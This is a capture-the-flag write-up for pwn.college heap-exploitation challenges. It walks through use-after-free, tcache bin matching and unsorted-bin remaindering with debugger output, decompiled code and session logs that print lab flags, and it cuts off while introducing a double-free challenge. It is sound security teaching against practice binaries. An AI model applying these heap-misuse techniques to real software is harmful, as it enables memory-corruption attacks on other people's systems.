---
custom_edit_url: null
sidebar_position: 3
slug: /pwn-college/program-security/dynamic-allocator-misuse
---

## Freebie (Easy)

```
hacker@dynamic-allocator-misuse~freebie-easy:~$ /challenge/freebie-easy 
###
### Welcome to /challenge/freebie-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): 
```

The program uses a memory space of 292 bytes to read the flag.

```
[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(292)
[*] flag_buffer = 0x5633693962c0
[*] read the flag!
```

But it SEGFAULTs when we try the `puts` command.

```
[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: Segmentation fault
```

### Use-After-Free

We can leverage a UAF vulnerability here, where we allocate 292 bytes of memory using `malloc`, and then free it using the `free` command.
It is important that we allocate the name number of bytes that the `read_flag` function uses, otherwise it will use another Tcache bin.

#### Tcache Binning
The heap allocator (GLIBC) doesn't just throw all freed memory into one big pile. It organizes freed chunks into "bins" based on their size.
- A chunk of `128` bytes goes into Bin `#7`.
- A chunk of `292` bytes goes into Bin `#17`.

When the program calls `malloc(N)`, the allocator only looks in the bin that matches size `N`.

We then use `read_flag` to instruct the program to read the flag next it will read it to the same location where the first allocated memory was, because that pointer is not cleared.
Next, when we use `puts`, the program will print the data pointed to by the original pointer. However, since we read the flag to that location, the flag will be printed.

### Exploit

```
hacker@dynamic-allocator-misuse~freebie-easy:~$ /challenge/freebie-easy 
###
### Welcome to /challenge/freebie-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 292

[*] allocations[0] = malloc(292)
[*] allocations[0] = 0x5c1c841ef2c0

[*] Function (malloc/free/puts/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #17     | SIZE: 281 - 296        | COUNT: 1     | HEAD: 0x5c1c841ef2c0       | KEY: 0x5c1c841ef010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x5c1c841ef2c0      | 0                   | 0x131 (P)                    | (nil)               | 0x5c1c841ef010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(292)
[*] flag_buffer = 0x5c1c841ef2c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{84MQn7Xg8iltuVV7AxkYMfwzHrQ.0VM3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Freebie (Hard)

```
hacker@dynamic-allocator-misuse~freebie-hard:~$ /challenge/freebie-hard 
###
### Welcome to /challenge/freebie-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

This time the program does not tell us how many bytes the `read_flag` function is allocating. We need to know this so that we can use the same number of bytes in our `malloc`.

- [ ] Size allocated for `read_flag`

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x00000000000010f0  __cxa_finalize@plt
0x0000000000001100  free@plt
0x0000000000001110  putchar@plt
0x0000000000001120  puts@plt
0x0000000000001130  __stack_chk_fail@plt
0x0000000000001140  printf@plt
0x0000000000001150  read@plt
0x0000000000001160  strcmp@plt
0x0000000000001170  malloc@plt
0x0000000000001180  setvbuf@plt
0x0000000000001190  open@plt
0x00000000000011a0  atoi@plt
0x00000000000011b0  __isoc99_scanf@plt
0x00000000000011c0  _start
0x00000000000011f0  deregister_tm_clones
0x0000000000001220  register_tm_clones
0x0000000000001260  __do_global_dtors_aux
0x00000000000012a0  frame_dummy
0x00000000000012a9  main
0x00000000000015b0  __libc_csu_init
0x0000000000001620  __libc_csu_fini
0x0000000000001628  _fini
```

#### `main()`

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000000012a9 <+0>:     endbr64
   0x00000000000012ad <+4>:     push   rbp
   0x00000000000012ae <+5>:     mov    rbp,rsp
   0x00000000000012b1 <+8>:     sub    rsp,0xe0
   0x00000000000012b8 <+15>:    mov    DWORD PTR [rbp-0xc4],edi
   0x00000000000012be <+21>:    mov    QWORD PTR [rbp-0xd0],rsi
   0x00000000000012c5 <+28>:    mov    QWORD PTR [rbp-0xd8],rdx
   0x00000000000012cc <+35>:    mov    rax,QWORD PTR fs:0x28
   0x00000000000012d5 <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x00000000000012d9 <+48>:    xor    eax,eax
   0x00000000000012db <+50>:    mov    rax,QWORD PTR [rip+0x2d3e]        # 0x4020 <stdin@@GLIBC_2.2.5>
   0x00000000000012e2 <+57>:    mov    ecx,0x0
   0x00000000000012e7 <+62>:    mov    edx,0x2
   0x00000000000012ec <+67>:    mov    esi,0x0
   0x00000000000012f1 <+72>:    mov    rdi,rax
   0x00000000000012f4 <+75>:    call   0x1180 <setvbuf@plt>
   0x00000000000012f9 <+80>:    mov    rax,QWORD PTR [rip+0x2d10]        # 0x4010 <stdout@@GLIBC_2.2.5>
   0x0000000000001300 <+87>:    mov    ecx,0x1
   0x0000000000001305 <+92>:    mov    edx,0x2
   0x000000000000130a <+97>:    mov    esi,0x0
   0x000000000000130f <+102>:   mov    rdi,rax
   0x0000000000001312 <+105>:   call   0x1180 <setvbuf@plt>
   0x0000000000001317 <+110>:   lea    rdi,[rip+0xcea]        # 0x2008
   0x000000000000131e <+117>:   call   0x1120 <puts@plt>
   0x0000000000001323 <+122>:   mov    rax,QWORD PTR [rbp-0xd0]
   0x000000000000132a <+129>:   mov    rax,QWORD PTR [rax]
   0x000000000000132d <+132>:   mov    rsi,rax
   0x0000000000001330 <+135>:   lea    rdi,[rip+0xcd5]        # 0x200c
   0x0000000000001337 <+142>:   mov    eax,0x0
   0x000000000000133c <+147>:   call   0x1140 <printf@plt>
   0x0000000000001341 <+152>:   lea    rdi,[rip+0xcc0]        # 0x2008
   0x0000000000001348 <+159>:   call   0x1120 <puts@plt>
   0x000000000000134d <+164>:   mov    edi,0xa
   0x0000000000001352 <+169>:   call   0x1110 <putchar@plt>
   0x0000000000001357 <+174>:   mov    QWORD PTR [rbp-0x98],0x0
   0x0000000000001362 <+185>:   mov    QWORD PTR [rbp-0xa0],0x106
   0x000000000000136d <+196>:   lea    rdi,[rip+0xcac]        # 0x2020
   0x0000000000001374 <+203>:   call   0x1120 <puts@plt>
   0x0000000000001379 <+208>:   lea    rdi,[rip+0xca8]        # 0x2028
   0x0000000000001380 <+215>:   mov    eax,0x0
   0x0000000000001385 <+220>:   call   0x1140 <printf@plt>
   0x000000000000138a <+225>:   lea    rax,[rbp-0x90]
   0x0000000000001391 <+232>:   mov    rsi,rax
   0x0000000000001394 <+235>:   lea    rdi,[rip+0xcbe]        # 0x2059
   0x000000000000139b <+242>:   mov    eax,0x0
   0x00000000000013a0 <+247>:   call   0x11b0 <__isoc99_scanf@plt>
   0x00000000000013a5 <+252>:   lea    rdi,[rip+0xc74]        # 0x2020
   0x00000000000013ac <+259>:   call   0x1120 <puts@plt>
   0x00000000000013b1 <+264>:   lea    rax,[rbp-0x90]
   0x00000000000013b8 <+271>:   lea    rsi,[rip+0xca0]        # 0x205f
   0x00000000000013bf <+278>:   mov    rdi,rax
   0x00000000000013c2 <+281>:   call   0x1160 <strcmp@plt>
   0x00000000000013c7 <+286>:   test   eax,eax
   0x00000000000013c9 <+288>:   jne    0x1446 <main+413>
   0x00000000000013cb <+290>:   mov    DWORD PTR [rbp-0xb0],0x0
   0x00000000000013d5 <+300>:   lea    rdi,[rip+0xc8a]        # 0x2066
   0x00000000000013dc <+307>:   mov    eax,0x0
   0x00000000000013e1 <+312>:   call   0x1140 <printf@plt>
   0x00000000000013e6 <+317>:   lea    rax,[rbp-0x90]
   0x00000000000013ed <+324>:   mov    rsi,rax
   0x00000000000013f0 <+327>:   lea    rdi,[rip+0xc62]        # 0x2059
   0x00000000000013f7 <+334>:   mov    eax,0x0
   0x00000000000013fc <+339>:   call   0x11b0 <__isoc99_scanf@plt>
   0x0000000000001401 <+344>:   lea    rdi,[rip+0xc18]        # 0x2020
   0x0000000000001408 <+351>:   call   0x1120 <puts@plt>
   0x000000000000140d <+356>:   lea    rax,[rbp-0x90]
   0x0000000000001414 <+363>:   mov    rdi,rax
   0x0000000000001417 <+366>:   call   0x11a0 <atoi@plt>
   0x000000000000141c <+371>:   mov    DWORD PTR [rbp-0xac],eax
   0x0000000000001422 <+377>:   mov    eax,DWORD PTR [rbp-0xac]
   0x0000000000001428 <+383>:   mov    rdi,rax
   0x000000000000142b <+386>:   call   0x1170 <malloc@plt>
   0x0000000000001430 <+391>:   mov    rdx,rax
   0x0000000000001433 <+394>:   mov    eax,DWORD PTR [rbp-0xb0]
   0x0000000000001439 <+400>:   mov    QWORD PTR [rbp+rax*8-0x98],rdx
   0x0000000000001441 <+408>:   jmp    0x136d <main+196>
   0x0000000000001446 <+413>:   lea    rax,[rbp-0x90]
   0x000000000000144d <+420>:   lea    rsi,[rip+0xc19]        # 0x206d
   0x0000000000001454 <+427>:   mov    rdi,rax
   0x0000000000001457 <+430>:   call   0x1160 <strcmp@plt>
   0x000000000000145c <+435>:   test   eax,eax
   0x000000000000145e <+437>:   jne    0x1485 <main+476>
   0x0000000000001460 <+439>:   mov    DWORD PTR [rbp-0xb0],0x0
   0x000000000000146a <+449>:   mov    eax,DWORD PTR [rbp-0xb0]
   0x0000000000001470 <+455>:   mov    rax,QWORD PTR [rbp+rax*8-0x98]
   0x0000000000001478 <+463>:   mov    rdi,rax
   0x000000000000147b <+466>:   call   0x1100 <free@plt>
   0x0000000000001480 <+471>:   jmp    0x136d <main+196>
   0x0000000000001485 <+476>:   lea    rax,[rbp-0x90]
   0x000000000000148c <+483>:   lea    rsi,[rip+0xbdf]        # 0x2072
   0x0000000000001493 <+490>:   mov    rdi,rax
   0x0000000000001496 <+493>:   call   0x1160 <strcmp@plt>
   0x000000000000149b <+498>:   test   eax,eax
   0x000000000000149d <+500>:   jne    0x14d5 <main+556>
   0x000000000000149f <+502>:   mov    DWORD PTR [rbp-0xb0],0x0
   0x00000000000014a9 <+512>:   lea    rdi,[rip+0xbc7]        # 0x2077
   0x00000000000014b0 <+519>:   mov    eax,0x0
   0x00000000000014b5 <+524>:   call   0x1140 <printf@plt>
   0x00000000000014ba <+529>:   mov    eax,DWORD PTR [rbp-0xb0]
   0x00000000000014c0 <+535>:   mov    rax,QWORD PTR [rbp+rax*8-0x98]
   0x00000000000014c8 <+543>:   mov    rdi,rax
   0x00000000000014cb <+546>:   call   0x1120 <puts@plt>
   0x00000000000014d0 <+551>:   jmp    0x136d <main+196>
   0x00000000000014d5 <+556>:   lea    rax,[rbp-0x90]
   0x00000000000014dc <+563>:   lea    rsi,[rip+0xb9b]        # 0x207e
   0x00000000000014e3 <+570>:   mov    rdi,rax
   0x00000000000014e6 <+573>:   call   0x1160 <strcmp@plt>
   0x00000000000014eb <+578>:   test   eax,eax
   0x00000000000014ed <+580>:   jne    0x1554 <main+683>
   0x00000000000014ef <+582>:   mov    DWORD PTR [rbp-0xb4],0x0
   0x00000000000014f9 <+592>:   jmp    0x1518 <main+623>
   0x00000000000014fb <+594>:   mov    rax,QWORD PTR [rbp-0xa0]
   0x0000000000001502 <+601>:   mov    rdi,rax
   0x0000000000001505 <+604>:   call   0x1170 <malloc@plt>
   0x000000000000150a <+609>:   mov    QWORD PTR [rbp-0xa8],rax
   0x0000000000001511 <+616>:   add    DWORD PTR [rbp-0xb4],0x1
   0x0000000000001518 <+623>:   cmp    DWORD PTR [rbp-0xb4],0x0
   0x000000000000151f <+630>:   jle    0x14fb <main+594>
   0x0000000000001521 <+632>:   mov    esi,0x0
   0x0000000000001526 <+637>:   lea    rdi,[rip+0xb5b]        # 0x2088
   0x000000000000152d <+644>:   mov    eax,0x0
   0x0000000000001532 <+649>:   call   0x1190 <open@plt>
   0x0000000000001537 <+654>:   mov    ecx,eax
   0x0000000000001539 <+656>:   mov    rax,QWORD PTR [rbp-0xa8]
   0x0000000000001540 <+663>:   mov    edx,0x80
   0x0000000000001545 <+668>:   mov    rsi,rax
   0x0000000000001548 <+671>:   mov    edi,ecx
   0x000000000000154a <+673>:   call   0x1150 <read@plt>
   0x000000000000154f <+678>:   jmp    0x136d <main+196>
   0x0000000000001554 <+683>:   lea    rax,[rbp-0x90]
   0x000000000000155b <+690>:   lea    rsi,[rip+0xb2c]        # 0x208e
   0x0000000000001562 <+697>:   mov    rdi,rax
   0x0000000000001565 <+700>:   call   0x1160 <strcmp@plt>
   0x000000000000156a <+705>:   test   eax,eax
   0x000000000000156c <+707>:   je     0x157c <main+723>
   0x000000000000156e <+709>:   lea    rdi,[rip+0xb1e]        # 0x2093
   0x0000000000001575 <+716>:   call   0x1120 <puts@plt>
   0x000000000000157a <+721>:   jmp    0x157d <main+724>
   0x000000000000157c <+723>:   nop
   0x000000000000157d <+724>:   lea    rdi,[rip+0xb24]        # 0x20a8
   0x0000000000001584 <+731>:   call   0x1120 <puts@plt>
   0x0000000000001589 <+736>:   mov    eax,0x0
   0x000000000000158e <+741>:   mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000001592 <+745>:   xor    rcx,QWORD PTR fs:0x28
   0x000000000000159b <+754>:   je     0x15a2 <main+761>
   0x000000000000159d <+756>:   call   0x1130 <__stack_chk_fail@plt>
   0x00000000000015a2 <+761>:   leave
   0x00000000000015a3 <+762>:   ret
End of assembler dump.
```

The second `malloc`, at `main+604` is what is called when we use the `read_flag` command. We can tell that it is the second one and not the first call to `malloc` at `main+386`, because the first one takes another input, which is the size of memory to be allocated. So the first call to `malloc` happens when we use the `malloc` command.

Let's put a breakpoint and run.

```
pwndbg> break *(main+604)
Breakpoint 1 at 0x1505
```

```
pwndbg> run
Starting program: /challenge/freebie-hard 
###
### Welcome to /challenge/freebie-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag


Breakpoint 1, 0x00005eab712ba505 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────
 RAX  0x106
 RBX  0x5eab712ba5b0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7b84ab44a297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x106
 RSI  0x5eab712bb07e ◂— 'read_flag'
 R8   1
 R9   0x7ffffff8
 R10  0x7fffffff
 R11  0x246
 R12  0x5eab712ba1c0 (_start) ◂— endbr64 
 R13  0x7ffc52383440 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffc52383350 ◂— 0
 RSP  0x7ffc52383270 ◂— 0
 RIP  0x5eab712ba505 (main+604) ◂— call malloc@plt
───────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────
 ► 0x5eab712ba505 <main+604>    call   malloc@plt                  <malloc@plt>
        size: 0x106
 
   0x5eab712ba50a <main+609>    mov    qword ptr [rbp - 0xa8], rax
   0x5eab712ba511 <main+616>    add    dword ptr [rbp - 0xb4], 1
   0x5eab712ba518 <main+623>    cmp    dword ptr [rbp - 0xb4], 0
   0x5eab712ba51f <main+630>    jle    main+594                    <main+594>
 
   0x5eab712ba521 <main+632>    mov    esi, 0                 ESI => 0
   0x5eab712ba526 <main+637>    lea    rdi, [rip + 0xb5b]     RDI => 0x5eab712bb088 ◂— 0x75710067616c662f /* '/flag' */
   0x5eab712ba52d <main+644>    mov    eax, 0                 EAX => 0
   0x5eab712ba532 <main+649>    call   open@plt                    <open@plt>
 
   0x5eab712ba537 <main+654>    mov    ecx, eax
   0x5eab712ba539 <main+656>    mov    rax, qword ptr [rbp - 0xa8]
────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffc52383270 ◂— 0
01:0008│-0d8 0x7ffc52383278 —▸ 0x7ffc52383458 —▸ 0x7ffc52384691 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-0d0 0x7ffc52383280 —▸ 0x7ffc52383448 —▸ 0x7ffc52384679 ◂— '/challenge/freebie-hard'
03:0018│-0c8 0x7ffc52383288 ◂— 0x100000000
04:0020│-0c0 0x7ffc52383290 ◂— 0
... ↓        3 skipped
──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5eab712ba505 main+604
   1   0x7b84ab360083 __libc_start_main+243
   2   0x5eab712ba1ee _start+46
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Size allocated for `read_flag`: `262`

### Exploit

```
hacker@dynamic-allocator-misuse~freebie-hard:~$ /challenge/freebie-hard 
###
### Welcome to /challenge/freebie-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 262


[*] Function (malloc/free/puts/read_flag/quit): free


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): puts

Data: pwn.college{I2KyXNxk50mkShkCYeSWWeQnub9.0lM3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Freebin Feint (Easy)

```
hacker@dynamic-allocator-misuse~freebin-feint-easy:~$ /challenge/freebin-feint-easy 
###
### Welcome to /challenge/freebin-feint-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(991)
[*] flag_buffer = 0x582868eee2c0
[*] read the flag!
```

This challenge is very similar to the previous one, only difference being that the size of the `flag_buffer` is pretty arbitrary this time. So we have to allocate the same size when we use `malloc`.

### Exploit

```
hacker@dynamic-allocator-misuse~freebin-feint-easy:~$ /challenge/freebin-feint-easy 
###
### Welcome to /challenge/freebin-feint-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(991)
[*] flag_buffer = 0x582868eee2c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 991

[*] allocations[0] = malloc(991)
[*] allocations[0] = 0x582868eee6b0

[*] Function (malloc/free/puts/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #61     | SIZE: 985 - 1000       | COUNT: 1     | HEAD: 0x582868eee6b0       | KEY: 0x582868eee010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x582868eee6b0      | 0                   | 0x3f1 (P)                    | (nil)               | 0x582868eee010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(991)
[*] flag_buffer = 0x582868eee6b0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{YmZfwVA6aurOwPF9E1iE4IdM40I.01M3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Freebin Feint (Hard)

```
hacker@dynamic-allocator-misuse~freebin-feint-hard:~$ /challenge/freebin-feint-hard 
###
### Welcome to /challenge/freebin-feint-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = 0x6241860a12a0

[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

Again, the `flag_buffer` is some arbitrary size.
In order to solve this challenge, we have to leverage Remaindering.

### Leveraging the Unsorted bin / cache

Memory managers handle splitting large memory blocks from the "top chunk" (the largest free block) to satisfy smaller allocation requests, creating a smaller "remainder" block that stays available in the heap.

This only happens if the Unsorted bin / cache is used instead of Tcache to allocated memory. For that we have to allocate a chunk of size greater than 1032 bytes, as Tcache only handles memory allocation upto 1032 bytes.

Currently, the `ptmalloc` caching design is (in order of use):
1. 64 singly-linked tcache bins for allocations of size 16 to 1032 (functionally "covers" fastbins and smallbins)
2. 10 singly-linked "fast" bins for allocations of size up to 160 bytes
3. 1 doubly-linked "unsorted" bin to quickly stash free()d chunks that don't fit into tcache or fastbins
4. 62 doubly-linked "small" bins for allocations up to 512 bytes
5. 63 doubly-linked "large" bins (anything over 512 bytes) that contain different-sized chunks

So, if we allocate a large enough space, then free it, and then call the `read_flag` command, we would not have to worry about the size of `flag_buffer` because it will be split and used from our large buffer allocation.

### Exploit

```
hacker@dynamic-allocator-misuse~freebin-feint-hard:~$ /challenge/freebin-feint-hard 
###
### Welcome to /challenge/freebin-feint-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 5000

[*] allocations[0] = 0x5618c504f2a0

[*] Function (malloc/free/puts/read_flag/quit): free


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = 0x5618c504f2a0

[*] Function (malloc/free/puts/read_flag/quit): puts

Data: pwn.college{su9bnqD-UlklEnJ8xjHEtaBKtSJ.0FN3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Free Flag Fumble (Easy)

```
hacker@dynamic-allocator-misuse~free-flag-fumble-easy:/$ /challenge/free-flag-fumble-easy 
###
### Welcome to /challenge/free-flag-fumble-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x59c50bb2c2c0
[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x59c50bb2c4b0
[*] read the flag!
```

This time the `read_flag` function reads the flag twice into buffers of size `480` bytes.

### Exploit

```
hacker@dynamic-allocator-misuse~free-flag-fumble-easy:/$ /challenge/free-flag-fumble-easy 
###
### Welcome to /challenge/free-flag-fumble-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c2c0
[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c4b0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 0

Size: 480

[*] allocations[0] = malloc(480)
[*] allocations[0] = 0x562a9e54c6a0

[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 1

Size: 480

[*] allocations[1] = malloc(480)
[*] allocations[1] = 0x562a9e54c890

[*] Function (malloc/free/puts/read_flag/quit): free

Index: 0

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #29     | SIZE: 473 - 488        | COUNT: 1     | HEAD: 0x562a9e54c6a0       | KEY: 0x562a9e54c010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x562a9e54c6a0      | 0                   | 0x1f1 (P)                    | (nil)               | 0x562a9e54c010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 1

[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #29     | SIZE: 473 - 488        | COUNT: 2     | HEAD: 0x562a9e54c890       | KEY: 0x562a9e54c010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x562a9e54c890      | 0                   | 0x1f1 (P)                    | 0x562a9e54c6a0      | 0x562a9e54c010      |
| 0x562a9e54c6a0      | 0                   | 0x1f1 (P)                    | (nil)               | 0x562a9e54c010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c890
[*] flag_buffer = malloc(480)
[*] flag_buffer = 0x562a9e54c6a0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

Index: 0

[*] puts(allocations[0])
Data: pwn.college{4d96a3J7Ce0XBHbjqikTX4-jo2e.0VN3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Free Flag Fumble (Hard)

```
hacker@dynamic-allocator-misuse~free-flag-fumble-hard:/$ /challenge/free-flag-fumble-hard 
###
### Welcome to /challenge/free-flag-fumble-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): read_flag
```

As always, the hard challenge does not tell us the size of the buffers into which the flag was read.

### Binary Analysis

```c title="/challenge/free-flag-fumble-hard :: main()" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // ecx
  int i; // [rsp+24h] [rbp-12Ch]
  unsigned int index_1; // [rsp+28h] [rbp-128h]
  unsigned int index; // [rsp+28h] [rbp-128h]
  unsigned int v8; // [rsp+28h] [rbp-128h]
  unsigned int size; // [rsp+2Ch] [rbp-124h]
  void *size_4; // [rsp+30h] [rbp-120h]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-8h]

  v13 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          puts(byte_2020);
          printf("[*] Function (malloc/free/puts/read_flag/quit): ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2020);
          if ( strcmp(choice, "malloc") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2020);
          index_1 = atoi(choice);
          if ( index_1 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 60u, "main");
          printf("Size: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2020);
          size = atoi(choice);
          ptr[index_1] = malloc(size);
        }
        if ( strcmp(choice, "free") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_2020);
        index = atoi(choice);
        if ( index > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 76u, "main");
        free(ptr[index]);
      }
      if ( strcmp(choice, "puts") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_2020);
      v8 = atoi(choice);
      if ( v8 > 0xF )
        __assert_fail("allocation_index < 16", "<stdin>", 88u, "main");
      printf("Data: ");
      puts((const char *)ptr[v8]);
    }
    if ( strcmp(choice, "read_flag") )
      break;
    for ( i = 0; i <= 1; ++i )
      size_4 = malloc(957uLL);
    v3 = open("/flag", 0);
    read(v3, size_4, 128uLL);
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

We can see that on making the `read_flag` choice, the program allocates two buffers of size `957` bytes.

### Exploit

```
hacker@dynamic-allocator-misuse~free-flag-fumble-hard:~$ /challenge/free-flag-fumble-hard 
###
### Welcome to /challenge/free-flag-fumble-hard!
###


[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 0

Size: 957


[*] Function (malloc/free/puts/read_flag/quit): malloc

Index: 1

Size: 957


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 0


[*] Function (malloc/free/puts/read_flag/quit): free

Index: 1


[*] Function (malloc/free/puts/read_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/quit): puts

Index: 0

Data: pwn.college{8Wq-xUWLolH-kpTT9mLLl4qgFmM.0lN3MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Fickle Free (Easy)

In this challege we have to leverage Double Free vulnerability.

### Double free

In the allocated memory chunks, the second set of 8 bytes include the pointer `key` to `tcache_perthread_struct`. Once a chunk is allocated, the `key` pointer no longer points to `tcache_perthread_struct` and is set to `NULL`. This state of the `key` is what helps Tcache distinguish free chunks from allocated ones.

```
a = malloc(16)
b = malloc(16)

free(b)
free(a)

a = malloc(16)


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  tcache_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
